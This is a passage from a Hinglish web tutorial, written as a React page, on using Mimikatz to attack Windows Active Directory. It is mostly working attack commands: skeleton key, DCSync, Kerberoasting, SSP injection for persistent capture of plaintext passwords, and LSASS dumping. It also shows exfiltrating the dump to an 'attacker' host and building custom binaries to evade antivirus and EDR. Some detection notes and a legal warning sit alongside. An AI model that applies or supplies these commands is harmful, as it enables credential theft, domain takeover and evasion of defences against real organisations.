        <li><strong className="text-white">Network Segmentation:</strong> Lateral movement rokne ke liye network segment karo</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="Practice Lab"
        code={`# VirtualBox/VMware mein Windows VM:
# Windows 10/11 ya Server 2019 install karo
# Domain join karo (AD lab)

# AD Lab Setup:
# 1. Windows Server 2019 — Domain Controller
# 2. Windows 10 — Domain joined workstation
# 3. Kali Linux — Attacker machine

# Practice scenarios:
# - Local credential dump (admin access)
# - Pass-the-Hash (lateral movement)
# - Golden Ticket (domain persistence)
# - DCSync (domain compromise)

# Safety: Sirf apne lab mein karo!
# Kali se download: sudo apt install mimikatz`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Mimikatz"
        code={`# Skeleton Key — sab passwords kaam karenge:
misc::skeleton
# Ab kisi bhi account par "mimikatz" password se login hoga

# DPAPI Master Key extraction:
dpapi::masterkey /in:C:\\path\\to\\masterkey /password:password

# Over-Pass-the-Hash (Kerberos):
sekurlsa::pth /user:admin /domain:target.local /ntlm:HASH /run:powershell.exe

# Token Impersonation (SYSTEM):
token::elevate
token::whoami

# Cached Credentials dump:
lsadump::cache

# LSA Secrets (service passwords):
lsadump::secrets

# Certificate Export:
crypto::capi /export
# PFX files export ho jayenge`}
      />
      <CodeBlock
        title="Kerberoasting with Mimikatz"
        code={`# Service account ke SPN tickets request karo:
kerberos::ask /target:SQLService/target.local

# Tickets save ho jayenge .kirbi format mein
# Offline cracking ke liye convert:
# kirbi2john.py se hashcat format mein

# Hashcat se crack:
hashcat -m 13100 service_hashes.txt wordlist.txt

# Ya Rubeus combo:
Rubeus.exe kerberoast /outfile:hashes.txt

# Defense:
# - Strong passwords for service accounts (25+ chars)
# - Group Managed Service Accounts (gMSA) use karo
# - SPN monitoring karo`}
      />
      <CodeBlock
        title="AS-REP Roasting"
        code={`# AS-REP Roasting — pre-auth disabled accounts:
# Mimikatz se directly:
kerberos::asreptarget /user:victim /domain:target.local

# Impacket se:
GetNPUsers.py target.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Hashcat se crack:
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Detection:
# - Pre-auth disable karo sab accounts se
# - Event ID 4768 monitor karo (AS-REP requests)
# - Kerberos authentication logging enable karo`}
      />
      <CodeBlock
        title="DCSync Attack Deep Dive"
        code={`# DCSync — Domain Controller se hashes pull karna
# Requirement: Domain Admin ya DS-Replication permission

# Single user ka hash:
lsadump::dcsync /user:Administrator /domain:target.local

# krbtgt hash (Golden Ticket ke liye):
lsadump::dcsync /user:krbtgt /domain:target.local

# Sab users ke hashes:
lsadump::dcsync /allusers /domain:target.local > all_hashes.txt

# Specific OU ke users:
lsadump::dcsync /user:svc_sql /domain:target.local

# Impacket se remote DCSync:
secretsdump.py target.local/Administrator:password@dc01.target.local
secretsdump.py -hashes 00:HASH target.local/Administrator@dc01.target.local

# Detection:
# - Event ID 4662 (Directory Service Access)
# - Replication requests monitor karo
# - Honey accounts use karo (fake admin detect karo)`}
      />
      <CodeBlock
        title="SSP Injection for Persistent Capture"
        code={`# SSP (Security Support Provider) injection
# Custom DLL LSASS mein load karo — passwords capture hote hain

# Step 1: Custom SSP DLL banao (Mimikatz ke saath aata hai)
# mimilib.dll — built-in SSP DLL

# Step 2: DLL ko system folder mein copy karo:
copy mimilib.dll C:\\Windows\\System32\\

# Step 3: Registry mein SSP add karo:
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "mimilib" /f

# Step 4: Reboot — SSP active ho jayega
# Ab sab logon events mein plaintext passwords capture honge
# Output: C:\\Windows\\System32\\kiwissp.log

# Detection:
# - LSA registry changes monitor karo
# - Event ID 4657 (Registry value modification)
# - Unknown SSP modules check karo`}
      />

      <h2>Signature Evasion and Custom Builds</h2>
      <p>
        Default Mimikatz build har antivirus se detect hota hai. Real engagements mein custom build banana padta hai — source code modify karke signatures change karte hain. Yeh technique red teamers commonly use karte hain taaki AV/EDR se bachein. EDR solutions bhi behavioral detection use karte hain — sirf signature evasion sufficient nahi hai, runtime behavior bhi modify karna padta hai.
      </p>
      <p>
        Custom build banane ka process simple hai lekin time-consuming hai. Source code mein strings rename karo, function names change karo, output messages modify karo, aur compile time randomize karo. Har build unique hona chahiye taaki hash-based detection na ho. Automated tools jaise Chimera aur ScareCrow is process ko streamline karte hain. Red teamers har engagement ke liye naya build banate hain taaki reusable signatures na banein.
      </p>
      <CodeBlock
        title="Custom Mimikatz Build"
        code={`# Source code clone karo:
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz

# String modifications karo:
# 1. mimikatz_strings.rc mein strings change karo
# 2. Module names rename karo (sekurlsa → mymodule)
# 3. Output messages modify karo
# 4. Function names obfuscate karo

# Visual Studio mein open karo:
# kiali.sln → Build → Configuration Manager
# x64 Release select karo

# Additional evasion:
# 1. Compile time randomize karo
# 2. Debug symbols remove karo
# 3. UPX se pack karo (compressed binary)
# 4. Custom loader se reflective load karo

# Automated obfuscation:
# Invoke-Obfuscation framework use karo
# Chimera tool se PowerShell payload obfuscate karo
# ScareCrow se binary generate karo (Go/C based loaders)`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Mimikatz ka output analyze karna critical step hai — raw output mein bahut saara data hota hai jo organize karna padta hai. Structured reporting se findings clearly present hoti hain stakeholders ko.
      </p>
      <CodeBlock
        title="Output Parsing and Reporting"
        code={`# Mimikatz output file mein save karo:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# PowerShell se parse karo:
$content = Get-Content output.txt -Raw
$pattern = 'Username\s*:\s*(.+)\\s+Domain\s*:\s*(.+)\\s+NTLM\s*:\s*([a-f0-9]{32})'
[regex]::Matches($content, $pattern) | ForEach-Object {
    [PSCustomObject]@{
        Username = $_.Groups[1].Value
        Domain = $_.Groups[2].Value
        NTLMHash = $_.Groups[3].Value
    }
} | Export-Csv -Path credentials.csv -NoTypeInformation

# CSV report ban jayega — Excel mein open karo

# Automated report generator:
# Python script se JSON output generate karo
# Phir HTML report banao findings ke saath`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Mimikatz large environments mein efficiently chalane ke liye kuch techniques hain. Jab poora domain dump karna ho toh targeted approach better hai — sab kuch ek saath dump karne se output bahut bada ho jata hai aur analysis mushkil hota hai. Network speed aur target machine ke resources bhi consider karo — slow networks par minidump transfer karo full dump ke bajay.
      </p>
      <p>
        Offline extraction best practice hai — dump file local machine pe laake analyze karo. Isse target machine par detection window chhota hota hai aur analysis ke liye unlimited time milta hai. CrackMapExec se parallel execution karo — ek saath multiple machines par credential dump kar sakte ho jo individual approach se bahut fast hai.
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Targeted Dump:</strong> sekurlsa::logonpasswords se pehle specific user select karo — poora LSASS dump slow hota hai</li>
        <li><strong className="text-white">Output Redirect:</strong> File mein save karo directly — console output slow hota hai: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt; creds.txt</li>
        <li><strong className="text-white">Minidump Use:</strong> LSASS ka full dump GB mein ho sakta hai — minidump sufficient hai credential extraction ke liye aur fast transfer hota hai</li>
        <li><strong className="text-white">Batch Processing:</strong> CrackMapExec se network-wide sweep karo — parallel execution fast hai individual machines ke comparison mein</li>
        <li><strong className="text-white">Offline Analysis:</strong> Dump file local machine pe laake offline extract karo — target machine par time kam spend hota hai aur detection risk kam</li>
        <li><strong className="text-white">Scripted Workflow:</strong> Manual commands ke bajay pre-written scripts use karo — consistency aur speed dono milte hain</li>
      </ul>
      <CodeBlock
        title="Efficient Credential Harvesting Workflow"
        code={`# Step 1: Procdump se LSASS dump (fast, signed tool)
procdump.exe -accepteula -ma -64 lsass.exe C:\\temp\\lsass.dmp

# Step 2: Dump ko attacker machine pe transfer
# SMB share se:
copy C:\\temp\\lsass.dmp \\\\attacker\\share\\
# ya PowerShell se:
Invoke-WebRequest -Uri http://attacker/upload -InFile C:\\temp\\lsass.dmp -Method POST

# Step 3: Offline extraction (attacker machine par)
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Step 4: Results parse karo
# PowerShell se CSV export:
Select-String -Path output.txt -Pattern "NTLM" | Out-File hashes.txt`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Mimikatz kya hai?', a: 'Windows credential extraction tool — LSASS memory se passwords, hashes, aur tickets extract karta hai. Benjamin Delpy ne banaya hai.' },
          { q: 'Kya Mimikatz free hai?', a: 'Haan, open source hai GitHub par. Lekin antivirus detect karta hai — careful use karo.' },
          { q: 'Mimikatz ko kaise hide karo?', a: 'Obfuscation, AMSI bypass, ya memory injection techniques use karo. Cobalt Strike ya Empire se bhi run kar sakte ho.' },
          { q: 'Pass-the-Hash kya hai?', a: 'NTLM hash se authenticate karna bina password jaane — Mimikatz ki sabse famous technique hai.' },
          { q: 'Golden Ticket kya hai?', a: 'Kerberos TGT forged ticket — unlimited domain access deta hai. krbtgt hash se banta hai.' },
          { q: 'DCSync kya hai?', a: 'Domain Controller se password hashes directly pull karna — bina DC par kuch kiye. Bahut powerful attack hai.' },
          { q: 'Kya Mimikatz remote kaam karta hai?', a: 'Nahi, Mimikatz locally chalta hai. Remote ke liye CrackMapExec ya Impacket use karo.' },
          { q: 'Mimikatz ko kaise detect karo?', a: 'LSASS access monitoring, SIEM alerts, Credential Guard, aur LSA Protection enable karo.' },
          { q: 'Kya Mimikatz Linux par chal sakta hai?', a: 'Nahi — sirf Windows par chalta hai. Linux ke liye secretsdump.py (Impacket) use karo.' },
          { q: 'Credential Guard 100% protect karta hai?', a: 'Nahi — Mimikatz ke paos bypass techniques hain. Lekin significantly difficult ban deta hai attackers ke liye.' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CrackMapExec</td><td className="py-2 px-3">Network credential attacks</td><td className="py-2 px-3">Remote credential dump, lateral movement</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Impacket</td><td className="py-2 px-3">Windows protocol exploitation</td><td className="py-2 px-3">secretsdump.py — remote SAM/LSA dump</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Rubeus</td><td className="py-2 px-3">Kerberos abuse toolkit</td><td className="py-2 px-3">C# based — better AV evasion</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SharpHound</td><td className="py-2 px-3">AD enumeration</td><td className="py-2 px-3">BloodHound data collector</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">LaZagne</td><td className="py-2 px-3">Password recovery</td><td className="py-2 px-3">All browsers, Wi-Fi, databases</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Seatbelt</td><td className="py-2 px-3">Security audit tool</td><td className="py-2 px-3">Host-based security checks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SharpDPAPI</td><td className="py-2 px-3">DPAPI abuse</td><td className="py-2 px-3">Credential vault decryption</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">nanodump</td><td className="py-2 px-3">LSASS dump</td><td className="py-2 px-3">Minimal detection, fileless</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Mimikatz real-world attacks mein bahut baar use hua hai — ransomware groups, APT actors, aur red teams sab iska use karte hain. Samjho ki attackers kaise use karte hain taaki defense better kar sako.
      </p>
      <p>
        Ransomware groups jaise Ryuk, Conti, REvil, aur LockBit ne Mimikatz ko apne attack chain mein include kiya hai. Initial access phishing se milta hai, phir Mimikatz se credentials dump hote hain, lateral movement hota hai, aur finally domain admin tak pahunchkar ransomware deploy hota hai. Ek case mein Conti group ne sirf 4 hours mein Mimikatz se credentials dump karke poora domain compromise kar liya tha.
      </p>
      <p>
        APT groups bhi Mimikatz use karte hain — APT28 (Fancy Bear), APT41, aur Lazarus Group ne sabne credential harvesting ke liye modified versions use kiye hain. Yeh groups custom builds banate hain jo AV se bach sakein — source code modify karke signatures change karte hain. Red teams ke liye lesson hai ki Mimikatz ko customize karna zaruri hai default build se zyada effective hone ke liye.
      </p>
      <p>
        Ek notable incident mein ek penetration tester ne Mimikatz se Skeleton Key attack kiya Domain Controller par — poora office "mimikatz" password se login kar sakta tha bina kisi ko pata chale. 2 weeks tak kisi ne detect nahi kiya. Is incident ke baad organization ne Credential Guard, LSA Protection, aur enhanced monitoring deploy kiya. Lesson: Mimikatz se bachne ke liye layered defense chahiye — koi ek solution sufficient nahi hai.
      </p>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Pehle privilege::debug run karo — bina iske kaam nahi karega</li>
          <li>WDigest enable karo registry se agar plaintext passwords chahiye: reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</li>
          <li>DCSync se Domain Admin bina login kiye hashes nikaal sakta hai</li>
          <li>Golden Ticket se 10 saal tak domain access maintain kar sakte ho</li>
          <li>AV detect kare toh Cobalt Strike ya Empire se run karo</li>
          <li>LSASS dump offline bhi kar sakte ho — Task Manager → Create Dump File</li>
          <li>Protected Users group sensitive accounts ke liye use karo</li>
          <li>Network segmentation lateral movement rokti hai</li>
          <li>Procdump (signed Microsoft tool) se LSASS dump karo — AV nahi detect karta</li>
          <li>CrackMapExec combo se network-wide credential harvesting possible hai</li>
          <li>Rubeus se Kerberos attacks better AV evasion ke saath kar sakte ho</li>
          <li>LSA Protection (RunAsPPL) enable karo sab machines par — basic defense hai</li>
          <li>Minidump use karo full dump ke bajay — fast transfer aur analysis</li>
          <li>Offline extraction safer hai — target par kam time spend hota hai</li>
          <li>CrackMapExec + Mimikatz combo se network-wide sweep ek command mein</li>
          <li>BloodHound se pehle path identify karo, phir Mimikatz se targeted dump</li>
          <li>Golden Ticket 10 saal tak valid rehta hai — krbtgt hash safely store karo</li>
          <li>Silver Ticket stealthier hai Golden Ticket se — specific service ke liye</li>
          <li>Invoke-Mimikatz se PowerShell mein run karo — disk write nahi hota</li>
          <li>SSP injection persistent hai — ek baar setup karo, passwords continuously capture honge</li>
          <li>DCSync se krbtgt hash nikalo — Golden Ticket se 10 saal tak domain access</li>
          <li>Minidump + offline extraction safest method hai — target par minimal footprint</li>
          <li>Custom build banao source code se — default signatures har AV detect karta hai</li>
          <li>BloodHound se shortest path identify karo pehle — targeted attack faster hai</li>
          <li>Output ko structured format mein save karo — reporting ke liye useful hai</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Mimikatz एक extremely powerful credential extraction tool है। इसका इस्तेमाल केवल authorized Red Team operations और security testing में ही करें। बिना अनुमति के credential extraction illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized access अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने lab environment में practice करें।
      </div>
    </TutorialLayout>
  )
}
